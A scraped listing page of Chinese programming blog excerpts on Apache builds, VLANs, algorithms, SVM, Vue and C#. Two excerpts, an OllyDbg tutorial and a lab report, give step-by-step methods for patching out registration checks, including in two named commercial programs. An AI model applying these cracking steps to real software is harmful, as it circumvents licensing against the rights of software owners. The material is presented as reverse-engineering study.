		配置和源码安装httpd服务 1. 配置和源码安装apache 安装开发环境 [root@cxr ~]# yum groups mark install "Development Tools" Updating Subscription Management repositories. Unable to read consumer identity This system is not registered to Red Hat Subscription Management. You can use subscription-manager to register. 上次元数据过期检查：1 day, 12:42:26 前，执行于 2022年04月15日 星期五 10时49分18秒。 依赖关系解决。 ======================================================================== 软件包 架构 版本 仓库 大小 ======================================================================== 安装组: Development Tools 事务概要 ======================================================================== 确定吗？[y/N]： y 完毕！ [root@cxr ~]# useradd -r -M -s /sbin/nologin apache [root@cxr ~]# id apache uid=975(apache) gid=973(apache) 组=973(apache) //创建一个不允许login当前Linux系统的系统用户,并且用户组也会跟着创建 //安装底层软件库 [root@cxr ~]# yum -y install openssl-devel pcre-devel expat-devel libtool httpd依赖于apr-1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d0bbc8549ab7802f34ecde8cc071b7c6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/922c018e15967dcb2a74d0eaca7b67f4/" rel="bookmark">
			基础VLAN划分（思科）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		将他们划分为2个vlan 从左边交换机开始
基本命令
Switch&gt;enable 特权模式
Switch#confi 全局配置模式
Switch(config)#vl 10 创建vlan10
Switch(config)#vl 20 创建vlan20
Switch(config-vlan)#int f0/1 进入端口
Switch(config-if)#switchport access vlan 30 将端口接入到vlan30
这里可以看到，我们之前没有创建vlan30，但是我们将端口划入vlan30的时候他会自动创建。六啊
退出并删除vlan30
我们用同样的方法创建另一个vlan后。
trunk链路配置
int f0/2 进入端口
Switch(config-if)#switchport mode trunk 定义为trunk链路
Switch(config-if)#switchport trunk allowed vlan 10,20 允许通过的vlan
另一个交换机也这么配
Switch(config-if)#switchport mode trunk Switch(config-if)#switchport trunk allowed vlan 10,20
ping一下
没问题 总结来讲，vlan划分就是
1.en 进入特权模式
2.conf 进入全局配置
3.int fa0/1 进入端口
4.sw a v 10 创建并划入vlan
5.进入交换机与交换机的接口。
6.sw m t 定义为trunk链路
7。sw t a v 10,20 允许通过的vl
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/922c018e15967dcb2a74d0eaca7b67f4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a0e2744fd7b695b2daff407b58833dcb/" rel="bookmark">
			根据数组创建二叉树【DS &#43; C&#43;&#43;】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		根据数组创建二叉树【DS + C++】 文章目录 根据数组创建二叉树【DS + C++】前言知识点——二叉树根据数组创建二叉树核心代码（C++） Code（C++）更新部分 后话 前言 刷了很多树的题目了，突然想在本地ide上运行一些测试用例，这时候需要我们在代码中新增树的创建的部分。语言为C++，ide为 visual studio 2022。
知识点——二叉树 二叉树是树的一种，而树相较于图，算是一种较为直观的数据结构，一棵完整的树包括根节点，中间节点，以及叶子节点。根节点是树的开始节点，有子节点，没有父节点，叶子节点是指树的最底层，子节点指向空，其实就是没有子节点，有父节点，而中间节点则是既有子节点也有父节点。当然这些节点的定义和解释基于一个前提：该树的节点树 &gt; 1。而对于一棵树，题目往往会给出根节点 root，因为树的任一个节点都只能通过自身去访问子节点，而不能访问父节点，所以为了能够访问整颗树，往往会给出根节点。欸？单向访问，听起来和我们之前学过的单链表是不是很类似呢？只不过单链表的节点只有next后向指针，指针指向下一个节点，而树的子节点指针却是可以有多个。
树的结构图
那么二叉树其实就很好理解了，二叉树其实就是每个节点都有两个子节点，分别为 left 和 next，两个指针，指向子节点。当然叶子节点的left和right自然指向空。
我之前写过一篇题解，当然那一篇并不是二叉树，而是n叉树，其实n叉树就是二叉树的 plus 版本，每个节点有n个子节点，相信聪明的你看到这里一定知道n个节点指针是以数组的形式存储了吧。
附上传送门链接 leetcode 559 每日一题题解 N叉树的最大深度——DFS与BFS_物联黄同学的博客-CSDN博客
根据数组创建二叉树 像我们平时在做leetcode或者牛客的题目的时候，往往题目给的数据并不是直接给一个数据指针啥的，而是会以数组的形式给出，如下图。
这里请忽略输出和解释哈。
数组中的null表示当前位置为空，也就是val=2的left节点是空的。
我们的任务就是要对形如这样的数组的数据，构造一个二叉树。
核心代码（C++） 首先我们要先定义树的节点
// 定义二叉树节点 struct TreeNode { int val; TreeNode* left; TreeNode* right; TreeNode(): val(0), left(nullptr), right(nullptr) {} TreeNode(int x): val(x), left(nullptr), right(nullptr) {} TreeNode(int x, TreeNode* left, TreeNode *right): val(x), left(left), right(right){} }; 然后由于输入中有null字样，我们需要使用字符串数组，存储输入。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a0e2744fd7b695b2daff407b58833dcb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b52bf7595d25225773cd47831a8999f3/" rel="bookmark">
			OllyDbg——基础1
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 界面常用的快捷键调试方式破解注册机制思路调试技巧总结 OllyDbg是一个新的动态追踪工具，将IDA与SoftICE结合起来的思想，Ring 3级调试器，支持插件扩展功能，是目前最强大的调试工具之一。建议下载汉化版的 界面 反汇编窗口：显示被调试程序的反汇编代码，包括地址、HEX数据、反汇编、注释
寄存器窗口：显示当前所选线程的CPU寄存器内容，点击标签可切换显示寄存器的方式
信息窗口：显示反汇编窗口中选中的第一个命令的参数及跳转目标地址、字符等
数据窗口：显示内存或文件的内容，右键菜单可切换显示方式
堆栈窗口：显示当前线程的堆栈
在反汇编窗口中有三个板块和一个注释区
常用的快捷键调试方式 F7：单步步入，功能通单步步过（F8）类似，区别是遇到CALL等子程序时会进入其中，进入后首先停留在子程序的第一条指令上。
F8:单步步过，每按一次这个按键，将执行反汇编窗口中的一条指令，遇到CALL等子程序不进入其代码。
Ctrl+G:一般用于跟踪字符串和跳转到指定位置
删除或禁止断点：
1、查看所设置的全部断点——点击显示页工具栏的B
2、选择要操作的断点右键进行操作或者快捷键空格
破解注册机制思路 所有应用程序要实现各种各样的功能都是要通过调用API函数！
文本框读取字符串的函数有2种
GetDlgItemTextA GetDlgItemTextW
GetWindowTextA GetWindowTextW
A表示ASCII的方式 ，W表示Unicode的方式
因为破解的注册机制需要输入用户名密码，使得成功登入
1、获取输入，查找文本框读取字符串的函数：ctrl+G——输入可能的字符串的函数名
2、在找到的字符串函数位置设置断点，运行到断点位置（F9）
3、即会弹出破解的程序的输入用户名和密码框，随意输入，注意输入的字符串最好在5位以上
4、此时OD里的代码会停在某个位置，按F7进入call里，发现无可用信息
5、按ctrl+F9回到4、的“OD里的代码会停在某个位置”处
6、之后继续往下走（F8）（这里不用F7是因为4、中进入函数没有看见有用信息），注意观察信息窗口的提示，会有有用信息，比如我们输入的用户名什么的
7、跳到信息窗口提示有用信息的位置，然后根据上下的机器码分析其操作
！注意：出现cal函数 之后出现test eax,eax时要注意 （因为任何函数在汇编里面返回值都存放在eax里），这里明显是测试函数返回值是否为0，之后跟着的通常为验证判断
8.可以将eax值改变使得返回非0或者直接把验证判断的代码去掉（双击用NOP填充）。
第二种操作如图：
把改过的地方保存起来：选上改过的地方——右键——复制到可执行文件——选择——在弹出窗口右键备份——保存数据到文件——新写一个文件名——保存
！注意：如果该程序加壳了，改过后可能无法正常执行。
其他种破解注册机制案例可看我之前写的博客https://blog.csdn.net/Woolemon/article/details/124232863
调试技巧总结 这是看小甲鱼OD调试篇的笔记，记录一下~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90e32eed3c7fc4c73a4e09df824429a7/" rel="bookmark">
			注册机制的研究
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 实验目的实验工具实验思想实验原理和步骤U盘监控器注册破解Free Internet Window Washer注册破解 实验总结 实验目的 研究软件注册机制，利用OD等工具破解U盘监控器、Free Internet Window Washer，绕过或发现注册码，达到注册成功目的。
实验工具 OllyDBG、W32DASM、WinHex等。
实验思想 OllyDbg动态分析的基本流程如下：
1、通常拿到一个软件先试着运行软件，如果有帮助文档查阅帮助文档，熟悉软件的基本用法，接着尝试输入错误的注册码，观察错误提示。
2、如果没有输入注册码的地方，要考虑是否是读取注册表或Key文件（程序读取一个文件中的内容判断是否注册），这些可以用其他工具来辅助分析。
3、如果都不是，原程序只是一个功能不全的试用版，那要注册为正式版需要手动写代码完善。
4、如果需要输入注册码，如上图所示，则调用查壳软件检查程序是否加壳（如PeiD、FI），有壳的需要脱壳之后再调用OllyDbg分析调试，无壳的直接调用工具调试。
实验原理和步骤 U盘监控器注册破解 U 盘监控器需要注册才能使用全部功能，我们的任务是使得输入任何注册码均能注册成功 。通常在注册时，程序会读取注册码，然后对注册码进行判 断: 正确则显示注册成功，转到正常的程序运行状态:错误则显示注册失败 ，转到未注册运行状态。
1.1、运行软件，获得与破解有关的信息；
1.2、寻找注册失败字符串地址；
1.3、使用 OD 获取引用该字符串的指令在内存中的地址；
内存地址：0x0400000+0x81A79,跳转到0x00481A79得到
1.4、使用W32DASM获得判断语句的位置；
分析：红框处提示错误信息代码位置：00405CD2,找到该位置，这是个分支语句，jg:表示跳转，其相反指令是jl，将jg改为jl，使其判断条件相反。
1.5、使用OD修改指令字节码。
如果我们将判断转移条件更改一下，错误则转到正常的运行状态，反之则转到来注册的运行状态 。这样，如果我们输入了错误的注册号，程序也会像输入了正确的注册号 一样运行，流程 如图所示。
1.6、OD中找到jg指令所在位置00405CD2，选择使用NOP填充，将jg改为jl.即可成功注册
Free Internet Window Washer注册破解 2.1、运行安装软件FIWWSetup2.9.exe，找到安装文件夹；
2.2、查壳：使用PEID工具检验是否加壳；
打开安装目录，将Clearpch.exe放入OD查壳，发现程序是无壳的
2.3、注册，发现报错字符串；
2.4、输入错误注册码，调试跟踪，发现注册判断代码位置；
1）既然程序没有加壳，那么直接用OD载入，然后使用OD的插件查找，由于软件是用Delphi编写的，则搜索的时候选择ACSII方式查询。
（2）在查询的时候遇到困难，并没有找到“Registration is not valid,please try agin。”这样的注册失败信息。
（3）由于该程序支持多国语言，来到安装目录下发现一个名为WLan_English.ini的文件，打开得知这是英文显示语言包，尝试在该文件中搜索注册失败信息，结果如下图:
在WLan_English.ini中查找到“RES_Registration_Error = Registration is not valid, please try again.”这样一条信息，于是尝试在OD（以管理员身份运行）中查找RES_Registration_Error，果然找到了 一处，如下图所示:
（5）双击RES_Registration_Error信息，来到反汇编窗口进行爆破
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/90e32eed3c7fc4c73a4e09df824429a7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d3bb7d36afd4b061c3e124d3e7ba46f8/" rel="bookmark">
			GTSAM安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.到git下载相应的安装包,下面是官方镜像，访问更流畅，
Release 4.1.1 · borglab/gtsam · GitHub (0z.gs)https://hub.0z.gs/borglab/gtsam/releases/tag/4.1.12.到文件路径下解压安装包
tar -zxvf gtsam-4.1.1.tar.gz 3.进入解压文件夹，进行编译安装
cd gtsam-4.1.1/ mkdir build cd build cmake .. make -j2 4.make install 安装，官方的方法是直接make install ，但是这样会出现如下问题：
所以，要用sudo make install安装。
sudo make install 安装成功。
自己的bug自己记录.^_^
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7ed73172fd758adf99c76ebc108ea063/" rel="bookmark">
			SVM支持向量机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、相关概念1.SVM2.SVM的分类3.SVM的三类问题 二、线性可分和线性不可分1.线性可分和线性不可分的定义2.点到超平面的距离 三、问题描述1.引出问题2.最优化理论 四、优化问题1.最大化间隔2.优化问题求解3.原问题与拉格朗日对偶问题 五、硬间隔最大优化问题求解六、软间隔最大优化问题求解1.近似线性可分问题导出2.优化问题求解 七、非线性SVM问题1.引出问题2.低维到高维的映射3.核函数4.常用的核函数 总结 前言 SVM被提出于1964年，在二十世纪90年代后得到快速发展并衍生出一系列改进和扩展算法，在人像识别、文本分类等模式识别（pattern recognition）问题中有得到应用 。SVM是由模式识别中广义肖像算法（generalized portrait algorithm）发展而来的分类器 ，其早期工作来自前苏联学者Vladimir N. Vapnik和Alexander Y. Lerner在1963年发表的研究 。1964年，Vapnik和Alexey Y. Chervonenkis对广义肖像算法进行了进一步讨论并建立了硬边距的线性SVM 。此后在二十世纪70-80年代，随着模式识别中最大边距决策边界的理论研究 、基于松弛变量（slack variable）的规划问题求解技术的出现 ，和VC维（Vapnik-Chervonenkis dimension, VC dimension）的提出 ，SVM被逐步理论化并成为统计学习理论的一部分 。1992年，Bernhard E. Boser、Isabelle M. Guyon和Vapnik通过核方法得到了非线性SVM 。1995年，Corinna Cortes和Vapnik提出了软边距的非线性SVM并将其应用于手写字符识别问题 ，这份研究在发表后得到了关注和引用，为SVM在各领域的应用提供了参考。
一、相关概念 1.SVM SVM本质模型是特征空间中最大化间隔的线性分类器,是一种二分类模型。
间隔最大使它有别于感知机。
2.SVM的分类 1.线性可分支持向量机（硬间隔最大化）
2.线性支持向量机（训练数据近似线性可分时，通过软间隔最大化。
3.非线性支持向量机（当训练数据线性不可分时，通过使用核技巧及软间隔最大化。
3.SVM的三类问题 （1）数据线性可分，硬间隔SVM
（2）数据近似线性可分，软间隔SVM
（3）数据不可以线性分，核技巧
二、线性可分和线性不可分 1.线性可分和线性不可分的定义 线性可分：有一条直线，可以将O和X分开。如下图
线性不可分：不存在一条直线，将O和X分开。
在高维度是，我们需要借助数学来定义
在数学上严格的定义：
在二维上
（大于0小于0区域使我们自己设的，你只需要令参数为相反，即区域就互换一下即可）
假设：现在有N个训练样本集以及他们的标签
严格定义：一个训练样本集{（xi，yi），…（xn，yn）}，在i=1–N线性可分，是指存在（w1，w2，b），使得对i=1—N,有：
用向量形式定义：
假设
可在总结为一句话：
2.点到超平面的距离 三、问题描述 1.引出问题 如果是线性可分的，在这无数多个分开各个类别的超平面中，到底哪一个才是最好的？
2.最优化理论 假设对任一条分开的线，把它向一侧平行的移动，当它擦到一个或几个样本为止。同时，也向另外一层平行移动。我们求的就是间隔最大的线
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7ed73172fd758adf99c76ebc108ea063/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5d24b1b476e1bfb589a0a41e9ec21bea/" rel="bookmark">
			elasticsearch7.X.X 已配置JAVA_HOME的情况下使用自带jdk
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 修改elasticsearh根目录下bin目录中的elasticsearch-env脚本 设置JAVA_HOME #注意 必须在 ES_HOME 后面 JAVA_HOME="$ES_HOME/jdk" 启动es ./bin/elasticsearch -d 检测是否启动成功 ps aux | grep elasticsearch 访问es curl http://127.0.0.1:9200 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e00fba293255851e1529cba62f61a90/" rel="bookmark">
			二分查找【详解】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本期介绍🍖 主要介绍：二分查找的简单思路，为什么必须在有序的前提下才能使用二分查找，该怎么用C程序来实现二分查找，二分查找的局限性👀。
目录🍖 简单思路前提条件编写程序总结 简单思路🍖 当我们要从一个序列中查找一个元素的时候，最快想到的方法就是顺序查找法（即：从前到后依次查找）。但这种方法过于无脑，就是暴力的把每个元素都排查一遍。元素个数少的时候还行，一旦元素个数多起来，效率是非常低下，所以在实际中这种查找的方法是被摒弃的。
这里就不得不介绍一种简单且效率较高的查找方法了：二分查找法，又称折半查找法。但该方法是建立在有序的前提下的，基本思路就是：
先找到那个有序序列的中间元素mid，然后拿它和要找的元素K进行比较，就可以初步判断K所在范围，既然查找范围已确定，自然该范围之外的元素就可以不用再查找了（你看这样相较于顺序查找一下子就可以省略一半的元素不用查找了，这就是效率啊！！！）。当然接下来还会按照上面的步骤反复查找下去。
因为二分查找每一次查找都可以缩减掉一半的查找范围，由此可以知道二分查找法的时间复杂度是: log ⁡ 2 ( N ) \log_2(N) log2​(N)。举个例子来解释该时间复杂度：若这里一共有2^32个元素，那么我在最坏的情况下也只需要32次就可以找到我想找的元素；而顺序查找法最坏的情况下，却需要查找 4,294,967,296‬ 次！！！，可见二分查找法的效率是非常之高的。
前提条件🍖 都说二分查找法的前提条件是：查找的序列必须是有序的。我想大概很多小伙伴都会错误的认为有序是差值恒为1的顺序数列（就像这样1、2、3、4、5、6、7、8、9）。这只不过是有序的某一种情况罢了，那何为有序呢？即该序列中的所有元素都是按照升序或者降序排列好的，元素与元素只间的差值虽然是随机的，但始终是在递增或递减（例如这样一个序列：3、12、24、31、46、48、66、79、82）。
那为什么二分查找的序列必须有序呢，而无序就不行？相信很多小伙伴都有此疑问，但却没有仔细的举例推敲。下面我举个例子：现有一个无序的序列如下图所示，我们要在其中查找是否存在元素77。
我们发现若是无序的序列，就算找到了中间的元素，也无法用它来判断所要查找元素所在的区间。如若硬是要使用二分查找法来查找元素（假想序列为递增），那么必然出错。就如上例，我们要查找元素77，而中间元素为100，可77小于100呀，所有我们认为我们所要找到的元素在100的左边，100及其右边都会被舍去。可眼睛告诉我们所要查找的元素77就在100右边呀，你怎么可以舍去呢？舍去后的结果自然是：查无此数呀！！！是错误的。
除此之外，二分查找只能实现单值查找，不可能实现多值查找！！！所以总结一下：
二分查找有两个限制条件：
查找的数量只能是一个，不能是多个查找的对象在逻辑上必须是有序的 编写程序🍖 上面介绍完二分查找的思路和其限制条件后，接下来就该讲一讲如何去实现代码了。就用该案来讲解吧：在下图所示序列中查找数字7，看是否能找到。
1. 第一步👀
首先，我们是要在一个有序的序列中查找某个元素的，那么该序列就必须有个连续的存储空间来存放，所以我们想到了用数组arr来存放。
#include&lt;stdio.h&gt; int main() { //存储递增的有序数列 int arr[] = { 1,2,3,4,5,6,7,8,9,10 }; } 2. 第二步👀
接下来，就该是找到序列的中间元素了，那该怎么找？我提供一个思路：通过对数组元素下标的计算来找到中间元素（中间元素下标mid=（数组最左边下标left + 最右边元素下标right）/ 2）。
程序如下所示：
#include&lt;stdio.h&gt; int main() { int arr[] = { 1,2,3,4,5,6,7,8,9,10 };//存储递增的有序数列 int sz = sizeof(arr) / sizeof(arr[0]);//sz是数组元素的总个数 int mid = 0;//存储中间元素的下标 //左、右元素下标确定了被查找元素k的所在范围 int left = 0;//最左边元素的下标 int right = sz - 1;//最右边元素的下标 int k = 0;//所要查找的元素k scanf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9e00fba293255851e1529cba62f61a90/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/870508c9d6f604b789b30121240ab368/" rel="bookmark">
			操作符的优先级如何影响表达式求值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		偶然看见这样一个代码
int i = 1; int j = (++i) + (++i) + (++i); printf("%d\n", j); 开始以为结果是9,但实际运算出来是12
这里用通过汇编来看看是怎么回事
从汇编过程可以看出，计算过程是先进行三次的++i，再将3个4进行相加
但这条代码在 不同编译器里可能是不同的结果，如上在Linux中的运行结果是10
后面在写代码的时候尽量避免这种读起来复杂还容易误会的代码吧
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/659f1a64c6b1241e279693feb9863a6c/" rel="bookmark">
			x86汇编语言基础知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 内存总线寄存器通用寄存器段寄存器状态标志EIP指令指针 数据表示x86基本操作指令指令格式操作数 x86汇编语言必备知识 x86汇编语言主要包括总线、寄存器结构，数据类型，基本的操作指令（包括数据传送指令、逻辑计算指令、算数运算指令），以及函数的调用规则。 具体内容可以查看这个博客https://www.cnblogs.com/jiftle/p/8453106.html
内存 一个程序内存主要分为以下四个节：
栈：用于函数的局部变量和参数，以及控制程序执行流。
堆：为程序执行期间需要的动态内存准备的，用于创建（分配）新的值以及消除（释放）不需要的值。也称动态内存。
代码：包含了执行程序任务时CPU取得的指令。决定了程序要做什么和怎么做。
数据：包含一些值，这些值在程序初始加载时被放到这里。称为动态值，因为程序运行时他们可能并不发生变化。也称全局值，因为程序任何部分都可以使用它们。
总线 地址总线的宽度决定CPU的寻址能力。一个CPU有N根地址总线，最多可以寻找2N内存单元（B）数据总线的宽度决定CPU与其他器件进行数据传送时的一次数据传送量。一个CPU有N根数据总线，一次可传送一个N位二进制数据。如：数据总线的宽度为8根则可传送1B的数据。控制总线的宽度决定CPU对系统中其他器件的控制能力。有多少根控制总线，意味着CPU提供了多少种对外部器件的控制。 寄存器 寄存器是可以被CPU使用的少量数据存储器，访问其中的内容的速度会比访问其他存储器要快。分为以下四类
通用寄存器 X86处理器中有8个32位的通用寄存器。
EAX：“累加器”(accumulator), 通常用于计算，它是很多加法乘法指令的缺省寄存器 ；存放函数返回值。
ECX：计数器(counter),通常用于循环变量计数， 是重复(REP)前缀指令和LOOP指令的内定计数器。
ESP：指示栈指针(用于指示栈顶位置)
EBP：指示基址指针（用于指示子程序或函数调用的基址指针）。
EBX:基地址寄存器
EDX: 总是被用来放整数除法产生的余数
ESI/EDI:“源/目标索引寄存器”,因为在很多字符串操作指令中, DS:ESI指向源串,而ES:EDI指向目标串。
！注意EAX、EBX、ECX和EDX的前两个高位字节和后两个低位字节可以独立使用，其中两位低字节又被独立分为H和L部分，这样做的原因主要是考虑兼容16位的程序
段寄存器 用于定位内存节
CS
SS
DS
ES
FS
GS
状态标志 标志寄存器，置位值为1或者清除值为0，这些值由CPU控制
ZF：当一个运算的结果等于0时，ZF被置位，否则被清除。
CF：当一个运算的结果相对于目标操作数太大或太小时，CF被置位，否则被清除。
SF：当一个运算的结果为负数，SF被置位；若结果为正数，SF被清除。对算术运算，当运算结果的最高位值为1时，SF也会被置位。
TF：TF用于调试。当它被置位时，x86处理器每次只执行一条指令。
EIP指令指针 在x86中，EIP寄存器又称指令指针或程序计数器，保存了程序将要执行的下一条指令在内存中的地址。EIP的唯一作用就是告诉处理器接下来要做什么。
控制了EIP即控制了CPU要执行什么，所以攻击者常常通过漏洞利用获得对EIP的控制（攻击者先要使攻击代码进入内存，然后改变EIP使其指向那段代码，从而攻击系统）
数据表示 在x86/x64体系中，指令处理的数据分为fundamental（基础）和numeric（数值）两大类。
基础（fundamental）类型：
byte（8位），word（16位），doubleword（32位），以及quadword（64位），它们代表指令能一次性处理的数据宽度。
数据（numeric）类型：
使用在运算类指令上
1、 integer（整型数）：包括unsigned类型和singed类型。
2、 floating-point（浮点数）：包括single-precision floating-point（单精度浮点数），double-precision floating-point（双精度浮点数），以及double extended-precision floating-point（扩展双精度浮点数）。
3、 BCD（binary-code decmial integer）：包括non-packed BCD码和packed-BCD码。
4、 SIMD（single instruction, multiple data）：这是属于packed类型的数据。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/659f1a64c6b1241e279693feb9863a6c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/87e8597ae26243dc0627867905a6c57e/" rel="bookmark">
			在vue项目中鼠标悬浮图片实现hover功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ds在使用vue得过程中往往有些功能UI库里是没有得，这里就需要我们自己写写样式来使得页面更好看.
css中hover这个属性就有一个过渡得效果，下面笔者需要实现得功能
这个图是笔者刷博客时候看到的，功能类似这样的，附上代码：
&lt;div class="con-box"&gt; &lt;div class="box-left"&gt; &lt;div class="box" @click="handleOk(plainOptions.id)"&gt; &lt;img :src="require('@/assets/register_img/titles1.png')" alt="" /&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="box-right" @mouseover="changeIndex()" @mouseout="changeIndexBack()"&gt; &lt;div class="box" v-show="!flag"&gt; &lt;img :src="require('@/assets/register_img/titles2.png')" alt="" /&gt; &lt;/div&gt; &lt;div class="box-content" v-show="flag"&gt; &lt;div class="box-cent-title"&gt;&lt;/div&gt; &lt;div class="box-title-center"&gt; &lt;a-form-model :model="form"&gt; &lt;a-checkbox-group v-model="form.checkboxIds"&gt; &lt;a-checkbox v-for="(item, int) in plainOptions.ordinaryEnterprise" :key="int" :value="item.id"&gt;{{ item.accountType }}&lt;/a-checkbox&gt; &lt;/a-checkbox-group&gt; &lt;/a-form-model&gt; &lt;a-button type="primary" @click="nextStep()"&gt;下一步 &lt;/a-button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; export default { data() { return { flag: false, plainOptions: { id: 8, ordinaryEnterprise: [ { id: 1, accountType: '专业仓储' }, { id: 2, accountType: '专业仓储' }, { id: 3, accountType: '专业仓储' }, { id: 4, accountType: '专业仓储' }, { id: 5, accountType: '专业仓储' }, ], }, form: {}, ids: null, checkFlag: true, } }, created() { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/87e8597ae26243dc0627867905a6c57e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8afcc78507b76b8a84c6f656bc1d648a/" rel="bookmark">
			八皇后问题（回溯法）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
什么是八皇后
八皇后问题怎么解决？
什么是回溯法
回溯法的模板
八皇后问题的核心代码
判断皇后位置是否可行
总体实现代码
每日一句：
种一棵树的最好时间是十年前，其次是现在。
什么是八皇后 八皇后问题（英文：Eight queens），是由国际西洋棋棋手马克斯·贝瑟尔于1848年提出的问题，是回溯算法的典型案例。
问题表述为：在8×8格的国际象棋上摆放8个皇后，使其不能互相攻击，即任意两个皇后都不能处于同一行、同一列或同一斜线上，问有多少种摆法。高斯认为有76种方案。1854年在柏林的象棋杂志上不同的作者发表了40种不同的解，后来有人用图论的方法解出92种结果。如果经过±90度、±180度旋转，和对角线对称变换的摆法看成一类，共有42类。
八皇后问题怎么解决？ 八皇后的解决办法有很多种，我们这里采取回溯法解决。
什么是回溯法 回溯法的处理思想类似于枚举搜索，我们枚举出每一种情况，然后在根据条件进行筛选，找到满足期望的值。我们把求解过程分为多个阶段，每个阶段我们都会面临一个十字路口，我们随便找一条路，走不通后，就回到上一个十字路口，选择另一个十字路口进行下一步，知道遍历完整个枚举情况。
回溯法的模板 在面临较简单的回溯问题是可以使用以下模板
void backtracking(参数) { if (终止条件) { 存放结果; return; } for (选择：本层集合中元素（树中节点孩子的数量就是集合的大小）) { 处理节点; backtracking(路径，选择列表); // 递归 回溯，撤销处理结果 } } 八皇后问题的核心代码 int []Queen=new int[8];//存取皇后所在列的位置 public void eightQueen(int row){ if (row==8){//当row等于8时说明八个皇后都放置好了 printQueens(Queen);//打印八皇后 return; } for (int column = 0; column &lt; 8; column++) { if (isOk(row,column)){//这里判断是否可以放在这个位置 Queen[row]=column;//放置皇后 eightQueen(row+1); } } } 那么有小伙伴就迷惑了，八皇后不应该是八行八列吗，为什么数组只是一个一维数组。这里就用到了回溯法的思想，把八行八列分成了八行，每一行都独立，而一维数组则只用来存取皇后的列坐标，行坐标由数组的下标代替。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8afcc78507b76b8a84c6f656bc1d648a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/37c1be1ae6564fee0bc8487676579ec8/" rel="bookmark">
			C# 发送带cookie的http请求_C#发送请求带cookie
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C# 发送带cookie的http请求_C#发送请求带cookie
一、Get请求带cookie
发送带cookie的请求，最好带上浏览器代理字符串：
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36
/// &lt;summary&gt; /// get请求,带cookie /// &lt;/summary&gt; /// &lt;param name="url"&gt;&lt;/param&gt; /// &lt;returns&gt;&lt;/returns&gt; public static async Task&lt;string&gt; GetAsync(string url, string cookie) { HttpClient client = new HttpClient(); if (string.IsNullOrEmpty(cookie) == false) { client.DefaultRequestHeaders.Add("cookie", cookie); } //指定浏览器代理 client.DefaultRequestHeaders.Add("user-agent", UserAgent); HttpResponseMessage resp = await client.GetAsync(url); //获取请求内容 HttpContent respContent = resp.Content; return await respContent.ReadAsStringAsync(); } 二、Post请求带cookie
/// &lt;summary&gt; /// Post 请求，无参(注：默认使用UTF8编码) /// &lt;/summary&gt; /// &lt;param name="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/37c1be1ae6564fee0bc8487676579ec8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fa533e9af916cd8dccf18a66ce0c8df3/" rel="bookmark">
			基于vue axios用户注册重复校验的问题（二）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		上一篇基于vue axios用户注册重复校验的问题(一）中，通过async，await关键字解决异步请求返回值时间问题后，点击注册按钮提交表单信息会发现存在另一个问题，无论用户查重结果如何，都能通过注册，数据库表中出现重复信息
